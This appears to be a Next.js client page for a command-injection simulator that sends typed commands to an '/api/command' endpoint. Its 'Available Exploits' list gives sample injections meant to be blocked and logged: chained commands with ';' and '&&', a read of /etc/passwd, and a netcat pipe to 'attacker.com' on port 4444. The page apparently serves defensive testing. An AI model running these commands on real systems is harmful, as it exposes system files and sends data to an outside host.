'use client';
import { useState } from 'react';

export default function InjectionTestPage() {
  const [cmd, setCmd] = useState('');
  const [result, setResult] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const handleExecute = async (e: React.FormEvent) => {
    e.preventDefault();
    setResult('');
    setErrorMsg('');
    
    try {
      const res = await fetch('/api/command', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cmd }),
      });
      
      const data = await res.json();
      if (res.ok) {
        setResult(data.output || 'Command executed empty result.');
      } else {
        setErrorMsg(data.error);
      }
    } catch (e) {
      setErrorMsg('Network error or system locked.');
    }
  };

  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="glass p-8 w-full max-w-2xl rounded-2xl relative">
        <h1 className="text-2xl font-bold mb-6 text-primary flex items-center gap-2 terminal-text uppercase tracking-widest">
          <span>&gt;</span> INJECTION_SIMULATOR
        </h1>
        <p className="text-sm text-primary/70 mb-6 font-mono">
          System utility active. Awaiting operator input...
        </p>

        <form onSubmit={handleExecute} className="space-y-4">
          <div>
            <label className="block text-sm font-bold mb-1 font-mono text-primary/80 uppercase">Enter Utility Command (e.g., echo Hello)</label>
            <div className="flex gap-2 mt-2">
              <span className="flex items-center text-primary pr-2">&gt;</span>
              <input
                type="text"
                className="flex-1 bg-black/50 border border-primary/50 text-primary rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-primary font-mono text-sm placeholder-primary/30"
                placeholder="echo system ok"
                value={cmd}
                onChange={(e) => setCmd(e.target.value)}
                required
              />
              <button
                type="submit"
                className="bg-primary/20 border border-primary text-primary px-6 py-2 rounded font-mono font-bold hover:bg-primary/40 transition-colors uppercase"
              >
                Execute
              </button>
            </div>
          </div>
        </form>

        {(result || errorMsg) && (
          <div className={`mt-6 p-4 rounded font-mono text-sm whitespace-pre-wrap ${errorMsg ? 'bg-red-900/20 text-red-500 border border-red-500/50' : 'bg-black text-primary/90 border border-primary/50 shadow-[0_0_15px_rgba(0,255,0,0.1)]'}`}>
            <div className="font-bold mb-3 uppercase text-xs opacity-70 tracking-widest border-b border-[inherit] pb-2">
              {errorMsg ? '[! ALERT: UNAUTHORIZED ACTION !]' : '--- Terminal Response ---'}
            </div>
            {errorMsg || result}
          </div>
        )}

        <div className="mt-8 text-xs text-primary/70 border-t border-primary/30 pt-4 font-mono">
          <p className="font-bold mb-3 uppercase text-primary tracking-widest">Available Exploits:</p>
          <ul className="list-disc pl-4 space-y-2 opacity-80">
            <li><code className="bg-primary/10 border border-primary/20 text-primary px-1.5 py-0.5 rounded">127.0.0.1; ls -la</code></li>
            <li><code className="bg-primary/10 border border-primary/20 text-primary px-1.5 py-0.5 rounded">ping 8.8.8.8 && cat /etc/passwd</code></li>
            <li><code className="bg-primary/10 border border-primary/20 text-primary px-1.5 py-0.5 rounded">echo test | nc attacker.com 4444</code></li>
          </ul>
          <p className="mt-4 italic">The system should block these immediately and log an injection attempt.</p>
        </div>
      </div>
    </div>
  );
}
